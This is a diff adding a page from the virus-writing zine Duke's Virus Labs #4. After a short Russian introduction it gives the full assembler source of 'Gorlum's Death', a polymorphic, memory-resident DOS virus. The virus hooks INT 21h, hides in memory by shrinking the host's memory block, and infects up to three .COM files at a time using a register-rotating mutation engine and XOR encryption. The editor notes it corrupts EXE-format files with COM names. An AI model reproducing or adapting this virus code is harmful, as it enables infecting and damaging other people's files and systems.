@@ -1,0 +1,535 @@
+- [Duke's Virus Labs #4] - [Page 16] -
+
+Gorlum's Death
+(c) by SMT/SMF
+
+Имя вируса    : Gorlum's Death
+Автор         : SMT/SMF
+Язык прогр.   : Turbo Assembler
+Дата создания : 22.01.99
+
+
+От редактора :
+   История создания этого вируса такова...
+   На своем компьютере некто GorLuM/Hell13 нашел и отловил новый вирус.
+   Вирус ничем не детектировался и лишь слегка подозревался эвристиками
+   на COM.TSR.CRYPT.Virus.
+   Тогда GorLuM принес этот вирус к нам в DVL (за что ему огромное спасибо :)
+   А SMT/SMF взял, и дизассемблировал его, и обозвал его "Mutation96".
+   И после этого на его основе написал свой вирус - "Gorlum's Death".
+   Вот эти два вируса мы и представляем вашему вниманию.
+   От себя замечу, что вирусы не проверяют файл на содержимое (наличие "MZ"
+   в начале файла) и портят файлы с EXE-структурой и COM-именем.
+
+От автора :
+
+Полиморфный резидентный неопасный вирус, поражает до трех .com - файлов в
+текущем каталоге за один вызов INT21 с функциями SELECT DISK и EXEC PROGRAM.
+Но т.к. в процессе работы пользователь сам меняет каталоги и вызовы INT21
+следуют достаточно часто, вирус может распространится довольно быстро по
+многим файлам и каталогам.
+Pезидент в памяти присутсвует в частично зашифрованном виде.
+
+===== Cut here =====
+.model tiny
+.code
+
+        org 11ah
+Decode:
+        org     100h
+start:
+        db 9ch dup (90h)        ; место под полиморфный расшифровщик
+
+nope:   nop
+        nop
+        jmp Virstart
+
+; -------------------- Наш обработчик INT21 --------------------------
+Resident:
+        cmp     ah,8fh          ; Если послан запрос на присутствие в памяти
+        jne     NOQUER
+        mov     ah,0fbh         ; то ответить утвердительно
+        jmp     Exit            ; и выйти
+NOQUER: cmp     ah,0eh          ; если функция "select disk",
+        je      OK
+        cmp     ax,4b00h        ; или функция "execute program",
+        jne     Exit
+                                ; то выполнить некоторые действия ;)
+OK:
+        pushf
+        push    ax bx cx dx di si bp ds es sp ss
+        push    cs
+        pop     ds
+        mov     ah,2Fh
+        int     21h             ; Получаем DTA в es:bx
+        mov     ax,es
+        mov     ds:[DTAofs],bx
+        mov     ds:[DTAseg],ax  ; Сохраняем DTA
+        push    cs
+        pop     es
+        call    xorer           ; Расшифруемся
+        call    MAIN            ; Что-то сделаем
+        call    xorer           ; Зашифруемся
+
+        mov     dx,ds:[DTAofs]
+        mov     ax,ds:[DTAseg]
+        mov     ds,ax
+        mov     ah,1Ah
+        int     21h             ; Восстанавливаем DTA
+        pop     ss sp es ds bp si di dx cx bx ax
+        popf
+Exit:
+        db      0eah            ; JMP FAR - переход на старый INT21
+int21of dw ?
+int21se dw ?
+
+
+;       ------------------ ""ШИФРАТОР"" -------------------
+xorer:
+        mov     di,offset body
+        mov     cx,offset virend - offset body
+megaxor:
+        db 81h,35h              ; глюк TASM'a, который не хочет ассемблировать
+                                ; XOR WORD PTR [DI] (он ассемблирует BYTE PTR)
+xorerv  dw 0
+        inc     di
+        inc     di
+        loop    megaxor
+        ret
+
+;------------------------------------------------------------
+body:                           ; Начало зашифр. части
+
+; --- Несколько упрощенный обработчик Abort,Retry,Ignore ----
+INT24:  mov     al,3            ; возвратить 'fail system call in progress'
+        iret
+
+; ------------------------------------------------------------
+zeroDTA:mov     word ptr ds:[DTA],0
+        mov     si,offset DTA
+        mov     di,offset DTA+2
+        mov     cx,16h
+        cld                     ; Всего лишь способ обнулить
+        rep     movsw           ; первые 24 байта DTA
+        ret
+; ------------------------------------------------------------
+Find1st:call    zeroDTA
+        mov     ah,4Eh
+        xor     cx,cx
+        mov     dx,ds:[cMask]
+        int     21h             ; Поиск первого файла по маске из ds:dx
+        ret
+; ------------------------------------------------------------
+FindNxt:mov     ah,4Fh
+        int     21h             ; Ищем следующий файл
+        ret
+; ------------------------------------------------------------
+SetPoly:
+        mov     cx,4Eh
+        mov     si,100h
+Fill1:  mov     [si],dx         ;Заполнение места под полиморфный расшифровщик
+        inc     si              ; какими-то несущественными инструкциями
+        inc     si
+        loop    Fill1
+        ret
+; ================== MAIN ROUTINE =====================
+MAIN:
+        xor     ax,ax
+        mov     es,ax
+        mov     ax,es:[92h]
+        mov     bx,es:[90h]     ; Перехват обработчика критических ошибок
+        mov     ds:[int24se],ax
+        mov     ds:[int24of],bx ; сохраним старый int24
+        cli
+        mov     es:[92h],ds     ; Установить свой обработчик
+        mov     ax,offset INT24 ; int 24
+        mov     es:[90h],ax     ;
+        sti
+        push    ds
+        pop     es
+        mov     ah,1Ah
+        mov     dx,offset DTA
+        int     21h             ; Установим свой DTA
+
+        mov     byte ptr ds:[First],1   ; Устанавливаем признак того, что
+                                        ; жертву надо будет потом запустить
+        mov     word ptr [virln],0
+        mov     ds:[counter],0          ; обнуляем счетчик пораж. файлов
+        mov     word ptr ds:[SILOD+1],offset nope
+        mov     word ptr ds:[cMask],offset ComMask
+        call    Find1st                 ; Начнем поиск .com-файов
+        jnc     short found
+        jmp     exitINT
+found:
+
+;                       MUTATION ENGINE
+; здесь подготавдиваются инструкции процессора с участием регистров
+; ax,cx,dx,bx,bp,si,di
+; каждый раз выбирается следующий регистр, после DI снова переходим к AX
+
+        cmp     byte ptr ds:[RGLOD],0BFh        ; если не DI....
+        jne     NxtReg                          ; переходим к след.
+                                                ; иначе снова AX
+        mov     byte ptr ds:[RGINC],3Fh         ; код, на 1 меньший, чем нужно
+        nop
+        mov     byte ptr ds:[RGLOD],0B7h        ; код, на 1 меньший, чем нужно
+        mov     byte ptr ds:[RGPUSH],4Fh        ; код, на 1 меньший, чем нужно
+NxtReg:                                 ; выбор следующего регистра из списка...
+        inc     byte ptr ds:[RGINC]     ; получаем нужный код для след. регистра
+        inc     byte ptr ds:[RGLOD]     ; получаем нужный код для след. регистра
+        inc     byte ptr ds:[RGPUSH]    ; получаем нужный код для след. регистра
+        cmp     byte ptr ds:[RGINC],44h ; регистр SP пропускаем,
+        je      NxtReg                  ;  потому что для него нет команды PUSH
+
+        mov     si,offset FName
+        mov     di,offset command
+        mov     cx,0Bh
+        cld
+        repe    cmpsb           ; сравнение найденного имени с 'COMMAND.COM'
+        jnz     notCOMMAND
+        jmp     nxtfile         ; не поражаем COMMAND.COM
+notCOMMAND:
+        mov     ax,3D02h
+        mov     dx,offset FName
+        int     21h             ; открываем найденный файл
+        jnc     OpenOK
+        jmp     nxtfile         ; не открылся - переходим к следующему, не
+                                ; задерживаем процесс заражения !-)
+OpenOK:
+        mov     bx,ax           ; запоминаем handle открытого файла
+        mov     ah,3Fh          ; функция чтения из файла
+        mov     cx,7            ; читаем первые 7 байт
+        mov     dx,offset OldShit
+        int     21h             ; Считываем и запоминаем начало файла
+        cmp     byte ptr ds:[OldShit+4],0C3h ; Проверка на повторное заражение
+        jne     Clean
+        mov     ah,3Eh          ; функция закрытия файла
+        int     21h             ; Уже поражен - закрываем и не беспокоим
+        jmp     nxtfile
+
+Clean:  inc     ds:[counter]    ; подсчет числа пораженных за один раз файлов
+        mov     ax,4202h
+        xor     cx,cx
+        xor     dx,dx
+        int     21h             ; Переход к концу файла
+        mov     word ptr ds:[virln],ax   ; Запомним длину файла жертвы
+        add     ax,offset nope
+        mov     word ptr ds:[SILOD+1],ax ; Запомним начало зашифр. кода
+        mov     ax,4200h
+        xor     cx,cx
+        xor     dx,dx
+        int     21h             ; Переход к началу файла
+
+        mov     ax,word ptr ds:[DTA+1ah] ; узнали размер файла из DTA поиска
+        add     ax,100h                  ; узнали стартовый адрес вируса
+        mov     word ptr ds:[RGLOD+1],ax ; изменили стартовый код вируса
+
+        mov     ah,40h          ; запись в файл
+        mov     cx,7
+        mov     dx,offset RGLOD
+        int     21h             ; В начало файла запишем переход
+                                ; на тело вируса
+
+        mov     ax,4202h
+        xor     cx,cx
+        xor     dx,dx
+        int     21h             ; Переход к концу файла
+
+        push    bx
+        cmp     ds:[AddSize],100h       ; Размер дописываемого мусора
+        je      ClearGarbage            ; не более 100h
+        inc     ds:[AddSize]            ; Увеличим размер дописываемого мусора
+        inc     word ptr ds:[CXLOD+1]   ; Увеличим размер зашифрованной части
+        jmp     sizeOK
+
+ClearGarbage:
+        mov     ds:[AddSize],0          ; обнулить размер дописываемого мусора
+        sub     word ptr ds:[CXLOD+1],100h
+sizeOK:
+
+;       Аналогично первой MUTATION ENGINE:
+;               выбор регистра из SI/DI
+
+        cmp     byte ptr ds:[incSI],47h
+        jne     SelectDI                ; если в прошлый раз был DI,
+        dec     byte ptr ds:[incSI]     ; то сейчас выбрать SI
+        dec     byte ptr ds:[xorSI+1]
+        dec     byte ptr ds:[SILOD]
+        dec     byte ptr ds:[Si1]
+        dec     byte ptr ds:[Si2+1]
+        jmp     Reg1
+SelectDI:
+        inc     byte ptr ds:[incSI]     ; иначе выбрать DI
+        inc     byte ptr ds:[xorSI+1]
+        inc     byte ptr ds:[SILOD]
+        inc     byte ptr ds:[Si1]
+        inc     byte ptr ds:[Si2+1]
+Reg1:
+
+; В зависимости от используемого регистра выбираем ничего не изменяющую
+; инструкцию, которой заполняем место между командами полиморфного расшифровщика
+
+        mov     dh,byte ptr ds:[RGINC]
+        cmp     dh,48h                  ; dec ax
+        jne     noAX
+        mov     dh,40h                  ; inc ax
+noAX:
+        cmp     dh,41h                  ; inc cx
+        jne     noCX
+        mov     dh,48h                  ; dec ax
+noCX:
+        cmp     dh,47h                  ; inc di
+        jne     noDI
+        mov     dh,4Bh                  ; dec bx
+noDI:
+        cmp     dh,46h                  ; inc si
+        jne     noSI
+        mov     dh,0FBh                 ; sti
+noSI:
+
+        mov     dl,dh                   ; заполняем выбранной командой
+        call    SetPoly                 ; код полиморфного расшифровщика
+
+        mov     ah,byte ptr ds:[incSI]
+        mov     bx,word ptr ds:[RandSeed] ; пред. значение генератора
+        cmp     bh,0                      ; псевдослучайных чисел
+        jne     RNDZ
+        mov     bh,63h
+        xor     bl,bl
+RNDZ:
+        inc     bl
+        dec     bh
+        mov     cl,bl
+        xor     ch,ch
+        mov     si,12eh                 ; ставим  inc REG  куда-нибудь
+                                        ; после 12eh
+        push    si
+        push    si
+        add     si,cx
+        mov     [si],ah
+        pop     si
+        mov     cl,bh
+        xor     ch,ch
+        add     si,cx
+        mov     [si],ah                 ; ставим  inc REG  куда-нибудь
+                                        ; после 12eh
+        mov     word ptr ds:[RandSeed],bx
+        pop     si
+        mov     ax,word ptr ds:[RndSeed2] ; переменная для другого
+        cmp     ax,5Fh                  ; генератора псевдослучайных чисел
+        jne     RND2
+        mov     ax,0Ah
+RND2:
+        inc     ax
+        add     si,ax
+        mov     dx,word ptr ds:[xorSI]
+        mov     [si],dx                 ; ставим куда-нибудь xor si,nnnn
+        mov     word ptr ds:[RndSeed2],ax
+        mov     ax,word ptr ds:[RndSeed3]
+        cmp     ax,11h
+        jne     RND3
+        xor     ax,ax
+RND3:
+        inc     ax
+        mov     di,106h
+        add     di,ax
+        mov     si,offset SILOD
+        mov     cx,3
+        rep     movsb   ; куда-нибудь ближе к началу ставим mov REG,start
+        mov     word ptr ds:[RndSeed3],ax
+        mov     ax,word ptr ds:[RndSeed4]
+        cmp     ax,0
+        jne     RND4
+        mov     ax,11h
+RND4:
+        dec     ax
+        mov     di,11ah
+        add     di,ax
+        mov     si,offset CXLOD
+        mov     cx,3
+        rep     movsb          ; куда-нибудь ближе к началу ставим mov cx,len
+        mov     word ptr ds:[RndSeed4],ax
+        mov     ax,word ptr ds:[RndSeed5]
+        cmp     ax,0
+        jne     RND5
+        mov     ax,8
+RND5:
+        dec     ax
+        mov     di,192h
+        add     di,ax
+        mov     dl,0E2h
+        xor     ch,ch                   ; Zero register
+        mov     cl,9Ah
+        sub     cx,ax
+        mov     dh,cl
+        mov     [di],dx                 ; ближе к концу ставим loop в начало
+        mov     word ptr ds:[RndSeed5],ax
+        mov     ah,2Ch
+        int     21h                     ; смотрим на часы...
+        mov     si,130h
+        add     si,word ptr ds:[RndSeed2]
+        mov     [si],dx     ; сколько секунд натикало - с тем числом и XOR'им
+        push    dx
+        mov     word ptr ds:[xorerv],0  ; когда-нибудь новая копия резидента
+                                        ; заработает (?), и она пока не заXORена
+        mov     si,100h
+        mov     di,offset virend
+        mov     cx,virlen
+        cld
+        rep     movsb                   ; переносим копию вируса в конец вируса
+        pop     dx
+        mov     word ptr ds:[xorerv],dx ; выбираем новую константу для
+                                        ; перешифровки резидента
+Si1:    mov     si,offset virend
+Si2:    add     si,offset nope - offset start
+
+        mov     byte ptr ds:[nope-1],0C3h       ; Ставим RET после шифровщика
+        call    Decode  ; call 11a
+        mov     byte ptr ds:[nope-1],90h        ; Восстанавливаем шифровщик
+
+        pop     bx
+        mov     cx,virlen
+        add     cx,ds:[AddSize]
+        mov     dx,offset virend
+        mov     ah,40h  ; дописываем вирус к файлу с учетом мусора
+        int     21h
+        mov     ax,5701h
+        mov     cx,word ptr ds:[DTA+16]
+        mov     dx,word ptr ds:[DTA+18]
+        int     21h     ; восстанавливаем старые дату/время создания файла
+        mov     ah,3Eh
+        int     21h     ; закрываем отмучавшийся файл
+
+; ---------- поиск и обработка следующего файла ------------
+nxtfile:cmp     ds:[counter],3          ; За один раз поражаем не
+        je      exitINT                 ; более 3x файлов :(
+        call    FindNxt
+        jc      exitINT
+        jmp     found
+
+;--------------- выход из главной процедуры ----------------
+exitINT:
+        xor     ax,ax
+        mov     es,ax
+        cli
+        mov     ax,ds:[int24se]
+        mov     bx,ds:[int24of]
+        mov     es:[92h],ax
+        mov     es:[90h],bx             ; восстановим int24
+        sti
+        xor     dx,dx
+        call    SetPoly         ; Сокрытие попыток построения полиморфа
+                                ; ( Уничтожение построенного расшифровщика )
+        ret
+
+; =============== Сюда попадаем после расшифровки ===================
+virstart:
+        mov     bp,0
+virln   equ     $-2             ; Здесь будет хранится длина жертвы
+        mov     ax,ds:[2ch]     ; Нашли сегмент с переменными среды
+        mov     [bp+envseg],ax
+;       mov     [bp+v643h],cs
+;       mov     [bp+v647h],cs
+;       mov     [bp+v63Fh],cs
+        mov     ah,8Fh
+        int     21h     ; Проверяем, есть ли резидент в памяти:
+        cmp     ah,0FBh ; Если "своя" функция возвращает 0FBh - выход
+        jne     NOQUIT
+        jmp     DOS
+NOQUIT:
+;        --------------- УСТАНОВКА РЕЗИДЕНТА ---------------
+        mov     ax,cs
+        dec     ax
+        mov     ds,ax                   ; Проверяем MCB программы
+        cmp     byte ptr ds:[0],5Ah     ; Если блок не последний, то верхняя
+        jne     short DOS       ; часть памяти скорее всего занята - ОБЛОМ :(
+                                ; (при попытке занять память она станет сегментированной)
+        mov     ax,ds:[3]       ; Обманываем DOS - уменьшаем размер программы,
+        sub     ax,(virlen/8)   ; после завершения не вся память
+        mov     ds:[3],ax       ; освободится, образуется потерянный блок,
+        mov     bx,ax           ; куда мы и сунем резидент
+        mov     ax,es
+        add     ax,bx
+        mov     es,ax           ; es=сегмент, куда будет установлен резидент
+        mov     si,bp
+        add     si,100h
+        mov     cx,2A4h
+        mov     ax,ds
+        inc     ax
+        mov     ds,ax
+        mov     di,100h
+        cld
+        rep     movsw      ; копируем вирус в верхнюю часть памяти (в es:100)
+        push    es
+        pop     ds
+        xor     ax,ax
+        mov     es,ax
+        mov     ax,es:[86h]
+        mov     bx,es:[84h]     ; В ax:bx - адрес обработчика INT21
+        mov     ds:[int21se],ax
+        mov     ds:[int21of],bx ; Сохраняем старый адрес INT21
+        cli
+        mov     es:[86h],ds
+        mov     ax,offset Resident      ; Устанавливаем новый обработчик,
+        mov     es:[84h],ax             ; более продвинутый ;)
+        sti
+
+DOS:
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+        cmp     byte ptr [bp+First],1   ; Если это первый запуск из инсталлятора,
+        je      short RUN
+        mov     ah,4Ch                  ; то жертвы нет
+        int     21h
+
+RUN:    mov     si,bp
+        mov     cx,7
+        add     si,offset Oldshit       ; Восстановим начало жертвы
+        mov     di,100h
+        cld
+        rep     movsb
+        mov     ax,100h
+        push    ax
+        retn                            ; Дадим жертве порулить...
+
+Oldshit db 7 dup (0)                    ; место для хранения начала жертвы
+
+
+
+command db 'COMMAND.COM'
+RGINC:  inc si
+SILOD:  mov si,800h
+CXLOD:  mov cx,virlen
+RGLOD:  mov si,4a2h
+RGPUSH: push si
+        ret
+incSI:  inc si
+xorSI:  xor word ptr ds:[SI],1234H
+
+ComMask db '*.com',0
+
+First   db 0
+envseg  dw ?
+int24of dw ?
+int24se dw ?
+DTAseg  dw ?
+DTAofs  dw ?
+counter dw ?
+AddSize dw 1
+RandSeed dw 5310h
+RndSeed2 dw 2bh
+RndSeed3 dw 10h
+RndSeed4 dw 7
+RndSeed5 dw 1
+
+cMask   dw ?                            ; Здесь прячем адрес маски .com-файла
+
+DTA     dw 18h dup (0)
+FName   equ DTA+1eh                     ; Найденное имя .com-файла
+
+virlen  equ $-start
+virend  label
+        end     start
+===== Cut here =====
